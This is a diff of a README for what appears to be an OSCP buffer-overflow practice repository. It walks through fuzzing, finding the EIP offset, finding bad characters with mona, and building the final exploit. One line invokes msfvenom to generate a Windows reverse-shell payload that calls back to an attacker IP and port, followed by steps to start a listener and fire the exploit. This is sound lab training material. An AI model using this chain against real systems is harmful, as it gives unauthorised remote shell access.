@@ -1,7 +1,9 @@
 # BoF4OSCP
 
 TODO: python3 setup.py IP PORT
+
 It's gonna edit all the python scripts with your target IP and PORT
+
 Then follow the next steps...
 
 Make sure mona is installed:
@@ -18,7 +20,8 @@ run python3 offset.py
 ```
 
 check on mona what is the EIP address
-Take the EIP address that looks EIP 386F...
+
+take the EIP address that looks EIP 386F...
 
 ## 2nd step : pattern create
 
@@ -30,15 +33,21 @@ Take the EIP address that looks EIP 386F...
 ## 3rd step : control EIP
 
 edit eipOverwrite.py with the correct offset
-run python3 eipOverwrite.py
+
+```python3 eipOverwrite.py```
+
 check on Immunity if EIP is well overwritten with 4B4B4B
 
 ## 4th step : finding badchars
 
+```
 python3 findingBadchars.py
+```
+
 right click on ESP, follow in dump
 
 find the badchars using the following command
+
 ```
 !mona compare -f c:\mona\bytearray.bin -a 005FF910(ESP ADDRESS)
 ```
@@ -53,4 +62,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.1 LPORT=4444 -e shikata_g
 ```
 edit finalBuff
 setup a listener
-python3 finalbuff
+
+```
+python3 finalBuffer.py
+```
